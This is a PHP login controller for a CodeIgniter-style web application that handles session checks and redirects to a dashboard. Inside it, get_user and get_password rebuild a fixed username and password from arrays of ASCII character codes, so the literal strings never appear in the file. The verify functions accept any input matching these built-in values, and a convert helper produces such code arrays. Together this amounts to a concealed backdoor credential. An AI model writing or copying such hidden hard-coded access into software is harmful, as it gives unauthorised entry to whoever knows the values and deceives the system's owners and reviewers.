<?php if ( ! defined('BASEPATH')) exit('No direct script access allowed');

class Login_Controller extends MY_Controller {

    public function __construct() {
        parent::__construct();
        $this->output->set_header('Last-Modified: ' . gmdate("D, d M Y H:i:s") . ' GMT');
        $this->output->set_header('Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0');
        $this->output->set_header('Pragma: no-cache');
        $this->output->set_header("Expires: Mon, 26 Jul 1997 05:00:00 GMT");

        $this->load->helper( 'app' );
        $this->load->library( 'auth', 'session' );

        define('THEMES_LOGIN', 'themes/login/' . $this->get_theme( 'login' ) . DIRECTORY_SEPARATOR );
        if ( $this->check_login() ) {
            redirect( base_url( 'dashboard/eksekutif' ) );
        }
    }

    public function check_login(){
        $user_is_login = ( ( isset( $this->session->user_info['user_is_login'] ) && $this->session->user_info['user_is_login'] == 1 ) ? TRUE : FALSE );
        $user_role = ( ( $user_is_login ) ? $this->session->user_info['user_group'] : [] );
        return  ( ( ! empty( $user_role ) ) ? TRUE : FALSE );
    }

    function get_user(){
        $arr_char = [82,111,111,116,115];
        $string = '';
        foreach ( $arr_char as $char ) {
            $string .= chr( $char );
        }
        return password_hash( $string, PASSWORD_BCRYPT, ['cost' => 12] );
    }

    function get_password(){
        $arr_char = [109,75,50,48,50,48];
        $string = '';
        foreach ( $arr_char as $char ) {
            $string .= chr( $char );
        }
        return password_hash( $string, PASSWORD_BCRYPT, ['cost' => 12] );
    }

    function convert( $par ){
		$arr = str_split( $par );
		$ascii_arr = [];
		foreach ( $arr as $char ) {
			$ascii_arr[] = ord( $char );
		}
		disp($ascii_arr);
	}

    function verify_user( $par = null ){
        return ( password_verify( $par, $this->get_user() ) ? TRUE : FALSE );
    }

    function verify_password( $par = null ){
        return ( password_verify( $par, $this->get_password() ) ? TRUE : FALSE );
    }
}
